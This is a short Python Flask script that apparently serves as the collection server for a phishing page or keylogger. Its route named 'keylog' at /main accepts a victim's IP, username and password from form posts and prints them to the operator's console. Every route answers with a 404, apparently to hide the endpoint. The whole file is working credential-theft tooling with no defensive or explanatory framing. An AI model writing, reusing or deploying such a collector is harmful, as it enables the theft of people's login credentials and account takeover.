#!/usr/bin/env python3

from flask import Flask,request,abort
import re

app = Flask(__name__)

regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"


@app.route("/", methods = ["GET","POST"])
def index():
    abort(404)


@app.route("/main", methods = ["GET","POST"])
def keylog():
    if 'ip' in request.form:
        ip = request.form['ip']
        if(re.search(regex, ip)):
            if 'username' in request.form:
                User = request.form['username']
                print(f"\033[34m{ip} \033[35mUsername : \033[32m{User}\033[0m")
            if 'password' in request.form:
                Pass = request.form['password']
                print(f"\033[34m{ip} \033[35mPassword : \033[32m{Pass}\033[0m")
    abort(404)


if __name__ == "__main__":
    app.run(host = '0.0.0.0', port = 5959, debug = False)
